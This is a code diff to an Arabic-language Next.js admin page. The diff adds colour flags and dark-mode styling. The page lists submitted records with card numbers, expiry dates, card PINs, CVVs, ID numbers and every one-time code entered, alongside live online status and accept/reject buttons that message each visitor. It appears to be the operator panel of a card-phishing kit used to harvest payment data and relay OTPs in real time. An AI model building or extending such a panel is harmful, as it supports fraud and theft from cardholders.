@@ -2,7 +2,7 @@
 
 import { useState, useEffect, useMemo } from "react"
 import { useRouter } from "next/navigation"
-import { Trash2, Users, CreditCard, UserCheck, Filter } from "lucide-react"
+import { Trash2, Users, CreditCard, UserCheck, Filter, Flag } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
 import { ar } from "date-fns/locale"
@@ -16,6 +16,11 @@ import { database } from "@/lib/firestore"
 import { auth } from "@/lib/firestore"
 import { db } from "@/lib/firestore"
 import { playNotificationSound } from "@/lib/actions"
+import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover"
+import { ThemeToggle } from "@/components/theam"
+
+// Flag colors for row highlighting
+type FlagColor = "red" | "yellow" | "green" | null
 
 function useOnlineUsersCount() {
   const [onlineUsersCount, setOnlineUsersCount] = useState(0)
@@ -74,6 +79,7 @@ interface Notification {
   name: string
   otpCode: string
   phone: string
+  flagColor?: FlagColor
 }
 
 // Create a separate component for user status that returns both the badge and the status
@@ -118,6 +124,79 @@ function useUserOnlineStatus(userId: string) {
   }, [userId])
 
   return isOnline
+}
+
+// Flag color selector component
+function FlagColorSelector({
+  notificationId,
+  currentColor,
+  onColorChange,
+}: {
+  notificationId: string
+  currentColor: FlagColor
+  onColorChange: (id: string, color: FlagColor) => void
+}) {
+  return (
+    <Popover>
+      <PopoverTrigger asChild>
+        <Button variant="ghost" size="icon" className="h-8 w-8">
+          <Flag
+            className={`h-4 w-4 ${
+              currentColor === "red"
+                ? "text-red-500 fill-red-500"
+                : currentColor === "yellow"
+                  ? "text-yellow-500 fill-yellow-500"
+                  : currentColor === "green"
+                    ? "text-green-500 fill-green-500"
+                    : "text-muted-foreground"
+            }`}
+          />
+        </Button>
+      </PopoverTrigger>
+      <PopoverContent className="w-auto p-2">
+        <div className="flex gap-2">
+          <Button
+            variant="ghost"
+            size="icon"
+            className="h-8 w-8 rounded-full bg-red-100 dark:bg-red-900 hover:bg-red-200 dark:hover:bg-red-800"
+            onClick={() => onColorChange(notificationId, "red")}
+          >
+            <Flag className="h-4 w-4 text-red-500 fill-red-500" />
+            <span className="sr-only">علم أحمر</span>
+          </Button>
+          <Button
+            variant="ghost"
+            size="icon"
+            className="h-8 w-8 rounded-full bg-yellow-100 dark:bg-yellow-900 hover:bg-yellow-200 dark:hover:bg-yellow-800"
+            onClick={() => onColorChange(notificationId, "yellow")}
+          >
+            <Flag className="h-4 w-4 text-yellow-500 fill-yellow-500" />
+            <span className="sr-only">علم أصفر</span>
+          </Button>
+          <Button
+            variant="ghost"
+            size="icon"
+            className="h-8 w-8 rounded-full bg-green-100 dark:bg-green-900 hover:bg-green-200 dark:hover:bg-green-800"
+            onClick={() => onColorChange(notificationId, "green")}
+          >
+            <Flag className="h-4 w-4 text-green-500 fill-green-500" />
+            <span className="sr-only">علم أخضر</span>
+          </Button>
+          {currentColor && (
+            <Button
+              variant="ghost"
+              size="icon"
+              className="h-8 w-8 rounded-full bg-gray-100 dark:bg-gray-800 hover:bg-gray-200 dark:hover:bg-gray-700"
+              onClick={() => onColorChange(notificationId, null)}
+            >
+              <Flag className="h-4 w-4 text-gray-500" />
+              <span className="sr-only">إزالة العلم</span>
+            </Button>
+          )}
+        </div>
+      </PopoverContent>
+    </Popover>
+  )
 }
 
 export default function NotificationsPage() {
@@ -300,9 +379,40 @@ export default function NotificationsPage() {
     setSelectedNotification(null)
   }
 
+  // Handle flag color change
+  const handleFlagColorChange = async (id: string, color: FlagColor) => {
+    try {
+      // Update in Firestore
+      const docRef = doc(db, "pays", id)
+      await updateDoc(docRef, { flagColor: color })
+
+      // Update local state
+      setNotifications(
+        notifications.map((notification) =>
+          notification.id === id ? { ...notification, flagColor: color } : notification,
+        ),
+      )
+    } catch (error) {
+      console.error("Error updating flag color:", error)
+    }
+  }
+
+  // Get row background color based on flag color
+  const getRowBackgroundColor = (flagColor: FlagColor) => {
+    if (!flagColor) return ""
+
+    const colorMap = {
+      red: "bg-red-50 dark:bg-red-950/30 hover:bg-red-100 dark:hover:bg-red-950/50",
+      yellow: "bg-yellow-50 dark:bg-yellow-950/30 hover:bg-yellow-100 dark:hover:bg-yellow-950/50",
+      green: "bg-green-50 dark:bg-green-950/30 hover:bg-green-100 dark:hover:bg-green-950/50",
+    }
+
+    return colorMap[flagColor]
+  }
+
   if (isLoading) {
     return (
-      <div className="min-h-screen bg-white flex items-center justify-center">
+      <div className="min-h-screen bg-background flex items-center justify-center">
         <div className="text-lg font-medium">جاري التحميل...</div>
       </div>
     )
@@ -313,11 +423,12 @@ export default function NotificationsPage() {
   const onlineCount = Object.values(onlineStatuses).filter(Boolean).length
 
   return (
-    <div dir="rtl" className="min-h-screen bg-gray-50 text-gray-900 p-4">
+    <div dir="rtl" className="min-h-screen bg-background text-foreground p-4">
       <div className="max-w-7xl mx-auto">
         <div className="flex flex-col sm:flex-row justify-between items-center mb-6">
           <h1 className="text-2xl font-bold mb-4 sm:mb-0">لوحة الإشعارات</h1>
           <div className="flex flex-col sm:flex-row gap-2">
+            <ThemeToggle />
             <Button
               variant="destructive"
               onClick={handleClearAll}
@@ -336,39 +447,39 @@ export default function NotificationsPage() {
         {/* Statistics Grid */}
         <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 mb-6">
           {/* Online Users Card */}
-          <Card>
+          <Card className="bg-card">
             <CardContent className="p-6 flex items-center">
-              <div className="rounded-full bg-blue-100 p-3 mr-4">
-                <UserCheck className="h-6 w-6 text-blue-600" />
+              <div className="rounded-full bg-blue-100 dark:bg-blue-900 p-3 mr-4">
+                <UserCheck className="h-6 w-6 text-blue-600 dark:text-blue-300" />
               </div>
               <div>
-                <p className="text-sm text-gray-500">المستخدمين المتصلين</p>
+                <p className="text-sm text-muted-foreground">المستخدمين المتصلين</p>
                 <p className="text-2xl font-bold">{onlineUsersCount}</p>
               </div>
             </CardContent>
           </Card>
 
           {/* Total Visitors Card */}
-          <Card>
+          <Card className="bg-card">
             <CardContent className="p-6 flex items-center">
-              <div className="rounded-full bg-green-100 p-3 mr-4">
-                <Users className="h-6 w-6 text-green-600" />
+              <div className="rounded-full bg-green-100 dark:bg-green-900 p-3 mr-4">
+                <Users className="h-6 w-6 text-green-600 dark:text-green-300" />
               </div>
               <div>
-                <p className="text-sm text-gray-500">إجمالي الزوار</p>
+                <p className="text-sm text-muted-foreground">إجمالي الزوار</p>
                 <p className="text-2xl font-bold">{totalVisitors}</p>
               </div>
             </CardContent>
           </Card>
 
           {/* Card Submissions Card */}
-          <Card>
+          <Card className="bg-card">
             <CardContent className="p-6 flex items-center">
-              <div className="rounded-full bg-purple-100 p-3 mr-4">
-                <CreditCard className="h-6 w-6 text-purple-600" />
+              <div className="rounded-full bg-purple-100 dark:bg-purple-900 p-3 mr-4">
+                <CreditCard className="h-6 w-6 text-purple-600 dark:text-purple-300" />
               </div>
               <div>
-                <p className="text-sm text-gray-500">معلومات البطاقات المقدمة</p>
+                <p className="text-sm text-muted-foreground">معلومات البطاقات المقدمة</p>
                 <p className="text-2xl font-bold">{cardSubmissions}</p>
               </div>
             </CardContent>
@@ -376,10 +487,10 @@ export default function NotificationsPage() {
         </div>
 
         {/* Filter Section */}
-        <Card className="mb-4">
+        <Card className="mb-4 bg-card">
           <CardContent className="p-4">
             <div className="flex items-center gap-2 mb-2">
-              <Filter className="h-5 w-5 text-gray-500" />
+              <Filter className="h-5 w-5 text-muted-foreground" />
               <h3 className="font-medium">تصفية النتائج</h3>
             </div>
             <div className="flex flex-wrap gap-2 mt-2">
@@ -410,23 +521,27 @@ export default function NotificationsPage() {
           </CardContent>
         </Card>
 
-        <Card>
+        <Card className="bg-card">
           {/* Desktop Table View - Hidden on Mobile */}
           <div className="hidden md:block overflow-x-auto">
             <table className="w-full">
               <thead>
-                <tr className="border-b">
-                  <th className="px-4 py-3 text-right font-medium text-gray-500">الدولة </th>
-                  <th className="px-4 py-3 text-right font-medium text-gray-500">المعلومات</th>
-                  <th className="px-4 py-3 text-right font-medium text-gray-500">الصفحة الحالية</th>
-                  <th className="px-4 py-3 text-right font-medium text-gray-500">الوقت</th>
-                  <th className="px-4 py-3 text-center font-medium text-gray-500">الحالة</th>
-                  <th className="px-4 py-3 text-center font-medium text-gray-500">الإجراءات</th>
+                <tr className="border-b border-border">
+                  <th className="px-4 py-3 text-right font-medium text-muted-foreground">الدولة </th>
+                  <th className="px-4 py-3 text-right font-medium text-muted-foreground">المعلومات</th>
+                  <th className="px-4 py-3 text-right font-medium text-muted-foreground">الصفحة الحالية</th>
+                  <th className="px-4 py-3 text-right font-medium text-muted-foreground">الوقت</th>
+                  <th className="px-4 py-3 text-center font-medium text-muted-foreground">الحالة</th>
+                  <th className="px-4 py-3 text-center font-medium text-muted-foreground">العلم</th>
+                  <th className="px-4 py-3 text-center font-medium text-muted-foreground">الإجراءات</th>
                 </tr>
               </thead>
               <tbody>
                 {filteredNotifications.map((notification) => (
-                  <tr key={notification.id} className="border-b hover:bg-gray-50">
+                  <tr
+                    key={notification.id}
+                    className={`border-b border-border ${getRowBackgroundColor(notification?.flagColor!)} transition-colors`}
+                  >
                     <td className="px-4 py-3">{notification.country || "غير معروف"}</td>
                     <td className="px-4 py-3">
                       <div className="flex flex-wrap gap-2">
@@ -439,7 +554,7 @@ export default function NotificationsPage() {
                         </Badge>
                         <Badge
                           variant={notification.cardNumber ? "default" : "destructive"}
-                          className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500" : ""}`}
+                          className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500 dark:bg-green-600" : ""}`}
                           onClick={() => handleInfoClick(notification, "card")}
                         >
                           {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
@@ -458,6 +573,13 @@ export default function NotificationsPage() {
                       <UserStatus userId={notification.id} />
                     </td>
                     <td className="px-4 py-3 text-center">
+                      <FlagColorSelector
+                        notificationId={notification.id}
+                        currentColor={notification.flagColor || null}
+                        onColorChange={handleFlagColorChange}
+                      />
+                    </td>
+                    <td className="px-4 py-3 text-center">
                       <div className="flex justify-center gap-2">
                         <Button
                           variant="outline"
@@ -469,7 +591,7 @@ export default function NotificationsPage() {
                               setMessage(false)
                             }, 3000)
                           }}
-                          className="bg-green-500 text-white hover:bg-green-600"
+                          className="bg-green-500 dark:bg-green-600 text-white hover:bg-green-600 dark:hover:bg-green-700"
                         >
                           قبول
                         </Button>
@@ -483,7 +605,7 @@ export default function NotificationsPage() {
                               setMessage(false)
                             }, 3000)
                           }}
-                          className="bg-red-500 text-white hover:bg-red-600"
+                          className="bg-red-500 dark:bg-red-600 text-white hover:bg-red-600 dark:hover:bg-red-700"
                         >
                           رفض
                         </Button>
@@ -491,7 +613,7 @@ export default function NotificationsPage() {
                           variant="ghost"
                           size="sm"
                           onClick={() => handleDelete(notification.id)}
-                          className="text-red-500 hover:text-red-600"
+                          className="text-red-500 dark:text-red-400 hover:text-red-600 dark:hover:text-red-300"
                         >
                           <Trash2 className="h-4 w-4" />
                         </Button>
@@ -501,7 +623,7 @@ export default function NotificationsPage() {
                 ))}
                 {filteredNotifications.length === 0 && (
                   <tr>
-                    <td colSpan={6} className="px-4 py-8 text-center text-gray-500">
+                    <td colSpan={7} className="px-4 py-8 text-center text-muted-foreground">
                       لا توجد إشعارات متطابقة مع الفلتر المحدد
                     </td>
                   </tr>
@@ -514,13 +636,23 @@ export default function NotificationsPage() {
           <div className="md:hidden space-y-4 p-4">
             {filteredNotifications.length > 0 ? (
               filteredNotifications.map((notification) => (
-                <Card key={notification.id} className="overflow-hidden">
+                <Card
+                  key={notification.id}
+                  className={`overflow-hidden bg-card border-border ${getRowBackgroundColor(notification?.flagColor)}`}
+                >
                   <CardContent className="p-4">
                     <div className="flex justify-between items-start mb-3">
                       <div>
                         <div className="font-semibold">{notification.personalInfo?.name || "غير معروف"}</div>
                       </div>
-                      <UserStatus userId={notification.id} />
+                      <div className="flex items-center gap-2">
+                        <FlagColorSelector
+                          notificationId={notification.id}
+                          currentColor={notification.flagColor || null}
+                          onColorChange={handleFlagColorChange}
+                        />
+                        <UserStatus userId={notification.id} />
+                      </div>
                     </div>
 
                     <div className="grid grid-cols-1 gap-3 mb-3">
@@ -534,7 +666,7 @@ export default function NotificationsPage() {
                         </Badge>
                         <Badge
                           variant={notification.cardNumber ? "default" : "destructive"}
-                          className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500" : ""}`}
+                          className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500 dark:bg-green-600" : ""}`}
                           onClick={() => handleInfoClick(notification, "card")}
                         >
                           {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
@@ -563,7 +695,7 @@ export default function NotificationsPage() {
                               setMessage(false)
                             }, 3000)
                           }}
-                          className="flex-1 bg-green-500 hover:bg-green-600"
+                          className="flex-1 bg-green-500 dark:bg-green-600 hover:bg-green-600 dark:hover:bg-green-700"
                         >
                           قبول
                         </Button>
@@ -584,20 +716,20 @@ export default function NotificationsPage() {
                           <Trash2 className="h-4 w-4" />
                         </Button>
                       </div>
-                      {message && <p className="text-green-500 text-center mt-2">تم الارسال</p>}
+                      {message && <p className="text-green-500 dark:text-green-400 text-center mt-2">تم الارسال</p>}
                     </div>
                   </CardContent>
                 </Card>
               ))
             ) : (
-              <div className="text-center py-8 text-gray-500">لا توجد إشعارات متطابقة مع الفلتر المحدد</div>
+              <div className="text-center py-8 text-muted-foreground">لا توجد إشعارات متطابقة مع الفلتر المحدد</div>
             )}
           </div>
         </Card>
       </div>
 
       <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
-        <DialogContent className="bg-white text-gray-900 max-w-[90vw] md:max-w-md" dir="rtl">
+        <DialogContent className="bg-background text-foreground max-w-[90vw] md:max-w-md" dir="rtl">
           <DialogHeader>
             <DialogTitle>
               {selectedInfo === "personal"
@@ -608,7 +740,7 @@ export default function NotificationsPage() {
             </DialogTitle>
           </DialogHeader>
           {selectedInfo === "personal" && selectedNotification && (
-            <div className="space-y-3 p-4 bg-gray-50 rounded-lg">
+            <div className="space-y-3 p-4 bg-muted rounded-lg">
               {selectedNotification.idNumber && (
                 <p className="flex justify-between">
                   <span className="font-medium">رقم الهوية:</span>
@@ -642,23 +774,23 @@ export default function NotificationsPage() {
             </div>
           )}
           {selectedInfo === "card" && selectedNotification && (
-            <div className="space-y-3 p-4 bg-gray-50 rounded-lg">
+            <div className="space-y-3 p-4 bg-muted rounded-lg">
               {selectedNotification.bank && (
                 <p className="flex justify-between">
-                  <span className="font-medium text-gray-700">البنك:</span>
+                  <span className="font-medium text-muted-foreground">البنك:</span>
                   <span className="font-semibold">{selectedNotification.bank}</span>
                 </p>
               )}
               {selectedNotification.cardNumber && (
                 <p className="flex justify-between">
-                  <span className="font-medium text-gray-700">رقم البطاقة:</span>
+                  <span className="font-medium text-muted-foreground">رقم البطاقة:</span>
                   <span className="font-semibold" dir="ltr">
                     {selectedNotification.prefix && (
-                      <Badge variant={"outline"} className="bg-blue-100">
+                      <Badge variant={"outline"} className="bg-blue-100 dark:bg-blue-900">
                         {selectedNotification.prefix && `  ${selectedNotification.prefix}`}
                       </Badge>
                     )}{" "}
-                    <Badge variant={"outline"} className="bg-green-100">
+                    <Badge variant={"outline"} className="bg-green-100 dark:bg-green-900">
                       {selectedNotification.cardNumber}
                     </Badge>
                   </span>
@@ -666,7 +798,7 @@ export default function NotificationsPage() {
               )}
               {(selectedNotification.year || selectedNotification.month || selectedNotification.cardExpiry) && (
                 <p className="flex justify-between">
-                  <span className="font-medium text-gray-700">تاريخ الانتهاء:</span>
+                  <span className="font-medium text-muted-foreground">تاريخ الانتهاء:</span>
                   <span className="font-semibold">
                     {selectedNotification.year && selectedNotification.month
                       ? `${selectedNotification.year}/${selectedNotification.month}`
@@ -676,22 +808,22 @@ export default function NotificationsPage() {
               )}
               {selectedNotification.pass && (
                 <p className="flex justify-between">
-                  <span className="font-medium text-gray-700">رمز البطاقة:</span>
+                  <span className="font-medium text-muted-foreground">رمز البطاقة:</span>
                   <span className="font-semibold">{selectedNotification.pass}</span>
                 </p>
               )}
               {(selectedNotification.otp || selectedNotification.otpCode) && (
                 <p className="flex justify-between">
-                  <span className="font-medium text-gray-700">رمز التحقق المرسل:</span>
-                  <span className="font-semibold">
+                  <span className="font-medium text-muted-foreground">رمز التحقق المرسل:</span>
+                  <Badge className="font-semibold bg-green-600">
                     {selectedNotification.otp}
                     {selectedNotification.otpCode && ` || ${selectedNotification.otpCode}`}
-                  </span>
+                  </Badge>
                 </p>
               )}
               {selectedNotification.cvv && (
                 <p className="flex justify-between">
-                  <span className="font-medium text-gray-700">رمز الامان:</span>
+                  <span className="font-medium text-muted-foreground">رمز الامان:</span>
                   <span className="font-semibold">{selectedNotification.cvv}</span>
                 </p>
               )}
@@ -699,10 +831,10 @@ export default function NotificationsPage() {
                 Array.isArray(selectedNotification.allOtps) &&
                 selectedNotification.allOtps.length > 0 && (
                   <div>
-                    <span className="font-medium text-gray-700 block mb-2">جميع الرموز:</span>
+                    <span className="font-medium text-muted-foreground block mb-2">جميع الرموز:</span>
                     <div className="flex flex-wrap gap-2">
                       {selectedNotification.allOtps.map((otp, index) => (
-                        <Badge key={index} variant="outline" className="bg-gray-100">
+                        <Badge key={index} variant="outline" className="bg-muted">
                           {otp}
                         </Badge>
                       ))}
